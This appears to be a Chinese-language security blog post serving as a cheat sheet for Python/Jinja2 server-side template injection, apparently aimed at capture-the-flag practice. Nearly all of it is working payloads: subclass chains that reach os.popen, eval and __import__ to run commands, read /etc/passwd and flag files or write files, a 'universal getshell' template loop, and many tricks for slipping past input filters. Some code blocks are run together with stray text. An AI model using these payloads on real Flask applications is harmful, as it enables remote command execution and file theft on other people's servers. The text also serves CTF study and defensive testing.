---
title: ssti
date: 2023-08-14 13:58:20
categories:
- 网络安全
tags:
- web 
- python
description: |
    模版注入漏洞
---

## 常见函数

```Python
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1     get传参
request.values.x1   所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1     post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data     post传参 (Content-Type:a/b)
request.json   post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>
```

## 常用过滤器

```Python
int()：将值转换为int类型；
float()：将值转换为float类型；
lower()：将字符串转换为小写；
upper()：将字符串转换为大写；
title()：把值中的每个单词的首字母都转成大写；
capitalize()：把变量值的首字母转成大写，其余字母转小写；
trim()：截取字符串前面和后面的空白字符；
wordcount()：计算一个长字符串中单词的个数；
reverse()：字符串反转；
replace(value,old,new)： 替换将old替换为new的字符串；
truncate(value,length=255,killwords=False)：截取length长度的字符串；
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
list()：将变量列成列表；
string()：将变量转换成字符串；
join()：将一个序列中的参数值拼接成字符串。通常有python内置的dict()配合使用
abs()：返回一个数值的绝对值；
first()：返回一个序列的第一个元素；
last()：返回一个序列的最后一个元素；
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
length()：返回一个序列或者字典的长度；
sum()：返回列表内数值的和；
sort()：返回排序后的列表；
attr(): 获取对象的属性
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count
```

## 利用链

python2、python3 通用 payload（因为每个环境使用的python库不同 所以类的排序有差异）

- 直接使用 popen（python2不行）

```py
os._wrap_close 类里有popen"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()1.2.3.4.
```

- 使用 os 下的 popen

```py
含有 os 的基类都可以，如 linecache"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()1.2.3.
```

- 使用`__import__`下的os（python2不行）

```py
可以使用 __import__ 的 os"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()1.2.3.
```

- `__builtins__`下的多个函数

```py
__builtins__下有eval，__import__等的函数，可以利用此来执行命令"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval（"__import__('os').popen('id').read()")"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

- 利用 python2 的 file 类读取文件

```py
在 python3 中 file 类被删除# 读文件
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()
# 写文件
"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')
# python2的str类型不直接从属于属于基类，所以要两次 .__bases__
```

- flask内置函数

```py
Flask内置函数和内置对象可以通过{{self.__dict__._TemplateReference__context.keys()}}查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）{{self.__dict__._TemplateReference__context.keys()}}
#查看内置函数
#函数：lipsum、url_for、get_flashed_messages
#类：cycler、joiner、namespace、config、request、session
{{lipsum.__globals__.os.popen('ls').read()}}
#函数
{{cycler.__init__.__globals__.os.popen('ls').read()}}
#类
```

如果要查config但是过滤了config直接用`self.__dict__`就能找到里面的config

- 通用 getshell

```py
原理就是找到含有 __builtins__ 的类，然后利用{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval（"__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}#读写文件
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

## 注入思路

```py
1.随便找一个内置类对象用__class__拿到他所对应的类
2.用__bases__拿到基类（<class 'object'>）
3.用__subclasses__()拿到子类列表
4.在子类列表中直接寻找可以利用的类getshell
对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数
```

### 做题思路

- 测试是否存在ssti漏洞`{{3*3}}`

- 查找可以利用的函数`{{%27%27.__class__.__base__.__subclasses__()}}`
- 提供 os._wrap_close 中的 popen 函数`?name={{%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()}}`#这种方法的缺点在于需要找到 类 的索引

>132这个位置可以用过脚本来找
>
>```py
>f = open('test.txt', 'r')
>data = f.read()
>r = data.split("<TemplateReference None>")
>for i in range(len(r)):
>    if 'catch_warnings' in r[i]:
>        print(i, '~~~', r[i])
>f.close()
>```
>
>也可以直接用 lipsum 和 cycler 执行命令
>`?name={{lipsum.__globals__['os'].popen('tac ../flag').read()}}`
>`?name={{cycler.__init__.__globals__.os.popen('ls').read()}}`
>
>或者用控制块去直接执行命令
>`?name={% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat ../flag').read()"))%}`

-

## jinjia

### 获取内置方法 以chr为例

```py
"".__class__.__base__.__subclasses__()[x].__init__.__globals__['__builtins__'].chr
get_flashed_messages.__globals__['__builtins__'].chr
url_for.__globals__['__builtins__'].chr
lipsum.__globals__['__builtins__'].chr
x.__init__.__globals__['__builtins__'].chr  (x为任意值)
```

**获取字符串**  
具体原理[可参考文章](https://blog.csdn.net/u011146423/article/details/88191225)

```py
request.args.x1   get传参
request.values.x1 get、post传参
request.cookies
request.form.x1   post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  post传参(Content-Type:a/b)
request.jsonpost传json  (Content-Type: application/json)
```

### 字符串构造

**1、拼接**  
`"cla"+"ss"`  
**2、反转**  
`"__ssalc__"[::-1]`

但是实际上我发现其实加号是多余的，在jinjia2里面，`"cla""ss"`是等同于`"class"`的，也就是说我们可以这样引用class，并且绕过字符串过滤

```py
""["__cla""ss__"]
"".__getattribute__("__cla""ss__")
""["__ssalc__"[::-1]]
"".__getattribute__("__ssalc__"[::-1])
```

**3、ascii转换**
jinjia2中的format函数可以将ascii码转换为字符

```py
"{0:c}".format(97)='a'
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
```

**4、编码绕过**
编码

```py
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
对于python2的话，还可以利用base64进行绕过
"__class__"==("X19jbGFzc19f").decode("base64")
```

**5、利用chr函数**  
因为我们没法直接使用chr函数，所以需要通过`__builtins__`找到他

```py
{% set chr=url_for.__globals__['__builtins__'].chr %}
{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
```

**6、在`jinja2`里面可以利用~进行拼接**

```py
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
```

**7、大小写转换**  
前提是过滤的只是小写

```py
""["__CLASS__".lower()]
```

**8、利用过滤器**
过滤器

```py
('__clas','s__')|join
["__CLASS__"|lower
"__claee__"|replace("ee","ss") 
"__ssalc__"|reverse
"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)


(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]

dict(__clas=a,s__=b)|join
```

### 获取键值或下标

```py
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```

### 获取属性

```py
().__class__
()["__class__"]
()|attr("__class__")
().__getattribute__("__class__")
```

## 有点意思

`{%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}`
